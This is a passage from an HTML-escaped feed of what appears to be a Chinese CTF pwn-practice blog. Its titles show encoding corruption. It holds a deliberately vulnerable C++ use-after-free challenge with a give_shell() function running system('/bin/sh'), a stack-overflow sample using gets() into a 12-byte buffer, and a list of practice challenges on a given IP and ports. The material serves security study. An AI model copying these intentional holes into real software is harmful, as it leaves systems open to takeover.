&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt; &lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstring&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstdlib&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Human&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">private&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">virtual&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="n">give_shell&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">protected&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">age&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">virtual&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="n">introduce&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;My name is &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;I am &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">age&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; years old&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Man&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">Human&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Man&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">age&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">age&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">age&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">virtual&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">introduce&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Human&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">introduce&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;I am a nice guy!&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Woman&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">Human&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Woman&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">age&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">age&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">age&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">virtual&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">introduce&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Human&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">introduce&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;I am a cute girl!&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[]){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Human&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Man&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Jack&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">25&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Human&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">w&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Woman&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Jill&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">21&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">size_t&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">op&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;1. use&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">2. after&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">3. free&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cin&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">op&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">switch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">op&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">introduce&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">w&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">introduce&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">atoi&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">len&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">O_RDONLY&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;your data is allocated&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">delete&lt;/span> &lt;span class="n">m&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">delete&lt;/span> &lt;span class="n">w&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="hcft2016-fheap">HCFt2016 fheap&lt;/h3>
&lt;h3 id="ç½‘é¼æ¯ctf2018-ç¬¬ä¸€åœº-pwn-babyheap">ç½‘é¼æ¯CTF2018 ç¬¬ä¸€åœº Pwn Babyheap&lt;/h3>
&lt;p>å‚è€ƒèµ„æ–™ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.cnblogs.com/Ox9A82/p/5320857.html" target="_blank" rel="noopener"
>https://www.cnblogs.com/Ox9A82/p/5320857.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.cnblogs.com/alert123/p/4918041.html" target="_blank" rel="noopener"
>https://www.cnblogs.com/alert123/p/4918041.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/qq_31481187/article/details/73612451" target="_blank" rel="noopener"
>https://blog.csdn.net/qq_31481187/article/details/73612451&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.anquanke.com/post/id/85281" target="_blank" rel="noopener"
>https://www.anquanke.com/post/id/85281&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4" target="_blank" rel="noopener"
>https://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.anquanke.com/post/id/85281" target="_blank" rel="noopener"
>https://www.anquanke.com/post/id/85281&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>PWN-å †æº¢å‡º_(å¾…è¡¥å……)</title><link>https://ykiko.top/p/pwn-%E5%A0%86%E6%BA%A2%E5%87%BA_%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Sat, 16 Mar 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/pwn-%E5%A0%86%E6%BA%A2%E5%87%BA_%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="pwn-å †æº¢å‡º_å¾…è¡¥å……">PWN-å †æº¢å‡º_(å¾…è¡¥å……)&lt;/h1>
&lt;h2 id="0x00-ç®€ä»‹">0x00 ç®€ä»‹&lt;/h2>
&lt;h2 id="0x01-åŸºç¡€çŸ¥è¯†">0x01 åŸºç¡€çŸ¥è¯†&lt;/h2></description></item><item><title>PWN-æ ˆæº¢å‡ºï¼ˆå¾…è¡¥å……ï¼‰</title><link>https://ykiko.top/p/pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Sun, 10 Mar 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="pwn-æ ˆæº¢å‡ºå¾…è¡¥å……">PWN-æ ˆæº¢å‡ºï¼ˆå¾…è¡¥å……ï¼‰&lt;/h1>
&lt;h2 id="0x00-ç®€ä»‹">0x00 ç®€ä»‹&lt;/h2>
&lt;h2 id="0x01-åŸºç¡€çŸ¥è¯†">0x01 åŸºç¡€çŸ¥è¯†&lt;/h2></description></item><item><title>ROPç»ƒä¹ (ç©º)</title><link>https://ykiko.top/p/rop%E7%BB%83%E4%B9%A0%E7%A9%BA/</link><pubDate>Thu, 28 Feb 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/rop%E7%BB%83%E4%B9%A0%E7%A9%BA/</guid><description>&lt;h1 id="ropç»ƒä¹ ç©º">ROPç»ƒä¹ (ç©º)&lt;/h1>
&lt;h3 id="é¢˜ç›®åˆ—è¡¨">é¢˜ç›®åˆ—è¡¨ï¼š&lt;/h3>
&lt;h3 id="ip47106212155">IP:&lt;code>47.106.212.155&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ret2libc3&lt;/p>
&lt;p>10008&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ret2shellcode&lt;/p>
&lt;p>10002&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ret2libc&lt;/p>
&lt;p>10005&lt;/p>
&lt;/li>
&lt;li>
&lt;p>train.cs.nctu.edu.tw: rop&lt;/p>
&lt;/li>
&lt;li>
&lt;p>2013-PlaidCTF-ropasaurusrex&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Defcon 2015 Qualifier: R0pbaby&lt;/p>
&lt;p>10012&lt;/p>
&lt;/li>
&lt;li>
&lt;p>train.cs.nctu.edu.tw: ret2libc&lt;/p>
&lt;/li>
&lt;li>
&lt;p>AliCTF 2016ï¼švss&lt;/p>
&lt;/li>
&lt;li>
&lt;p>RCTF2015-welpwn&lt;/p>
&lt;p>10010&lt;/p>
&lt;/li>
&lt;li>
&lt;p>lctf16-pwn100&lt;/p>
&lt;p>10011&lt;/p>
&lt;/li>
&lt;li>
&lt;p>xdctf15-pwn200&lt;/p>
&lt;p>10013&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>WPï¼ˆæŒç»­æ›´æ–°ï¼‰ï¼š&lt;/p></description></item><item><title>CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_1æ ˆæº¢å‡º</title><link>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</link><pubDate>Wed, 20 Feb 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</guid><description>&lt;h1 id="ctf-pwnåˆ·é¢˜è®°å½•-ctfwiki_1æ ˆæº¢å‡º">CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_1æ ˆæº¢å‡º&lt;/h1>
&lt;hr>
&lt;blockquote>
&lt;p>çœ‹CTFWikiæ¥å…¥é—¨CTF-PWN (Linuxå’Œarm) åšä¸ªè®°å½•&lt;/p>
&lt;/blockquote>
&lt;p>çŸ¥è¯†ç‚¹ï¼šPWNç›¸å…³çŸ¥è¯†ç‚¹æ€»ç»“&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Linux PWN&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ARM PWN&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>é¢˜ç›®å…¨éƒ¨æ¥æºäº &lt;a class="link" href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/" target="_blank" rel="noopener"
>CTFWiki&lt;/a> ä¸Šæ‰€æ¶‰åŠé¢˜ç›®&lt;/p>
&lt;h2 id="linux-pwn">Linux PWN&lt;/h2>
&lt;p>å¤§éƒ¨åˆ†åŸç†å‚è€ƒ&lt;a class="link" href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/" target="_blank" rel="noopener"
>CTFWiki&lt;/a>&lt;/p>
&lt;h3 id="æ ˆæº¢å‡º">æ ˆæº¢å‡º&lt;/h3>
&lt;h3 id="åŸºæœ¬æ ˆæº¢å‡º">åŸºæœ¬æ ˆæº¢å‡º&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">success&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;You Hava already controlled it.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">vulnerable&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">gets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
